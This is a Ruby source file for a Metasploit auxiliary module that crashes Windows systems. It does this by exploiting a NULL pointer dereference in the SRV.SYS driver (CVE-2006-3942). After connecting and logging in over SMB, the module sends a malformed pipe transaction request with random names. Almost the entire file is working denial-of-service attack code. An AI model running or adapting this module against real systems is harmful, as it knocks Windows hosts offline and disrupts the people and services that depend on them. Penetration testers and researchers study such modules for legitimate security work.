require 'msf/core'

module Msf

class Auxiliary::Dos::Windows::Smb::TRANS_PIPE_NONULL < Msf::Auxiliary

	include Auxiliary::Dos
	include Exploit::Remote::SMB

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Microsoft SRV.SYS Pipe Transaction No Null',
			'Description'    => %q{
				This module exploits a NULL pointer dereference flaw in the
			SRV.SYS driver of the Windows operating system. This bug was
			independently discovered by CORE Security and ISS.
			},
			
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 3666 $',
			'References'     =>
				[
					['CVE', '2006-3942'],
					['BID', '19215'],
				]
		))
		
	end

	def run

		print_status("Sending a bad SMB transaction request...");

		connect
		smb_login

		begin
			self.simple.client.trans_nonull(
				"\\#{Rex::Text.rand_text_alphanumeric(rand(16)+1)}", 
				'', 
				Rex::Text.rand_text_alphanumeric(rand(16)+1), 
				3, 
				[1,0,1].pack('vvv'), 
				true
			)

		rescue ::Interrupt
			return

		rescue ::Exception => e
			print_status("Error: #{e.class.to_s} > #{e.to_s}")
		end


		disconnect
	end

end
end	
